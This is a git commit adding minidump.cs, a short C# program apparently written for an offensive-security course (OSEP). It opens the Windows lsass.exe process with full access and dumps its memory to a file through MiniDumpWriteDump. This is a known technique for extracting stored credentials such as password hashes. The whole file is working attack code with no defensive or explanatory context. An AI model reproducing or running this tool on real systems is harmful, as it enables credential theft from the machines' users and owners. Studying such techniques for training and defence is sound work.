71661082729b4a807c3597be779109846cd79845
ROB3RT <62238353+robertaaron1999@users.noreply.github.com>
2023-04-21 17:28:56 +0400

    Create minidump.cs

---
+++ minidump.cs
@@ -0,0 +1,35 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+
+
+namespace Minidump
+{
+    class Program
+    {
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        static void Main(string[] args)
+        {
+            Console.WriteLine("[+]File Path Created \r\n");
+            FileStream dumpFile = new FileStream("C:\\Users\\admin\\Documents\\Courses\\OSEP\\Tools\\lsass.dmp", FileMode.Create);
+            Process[] lsass = Process.GetProcessesByName("lsass");
+            Console.WriteLine("[+]Lsass.exe process ID found \r\n");
+            int lsass_pid = lsass[0].Id;
+            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+            Console.WriteLine("[+]Process Handle to lsass.exe created \r\n");
+            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero,IntPtr.Zero);
+            Console.WriteLine("[+]Lsass.exe process successfully dumped \r\n");
+        }
+    }
+}
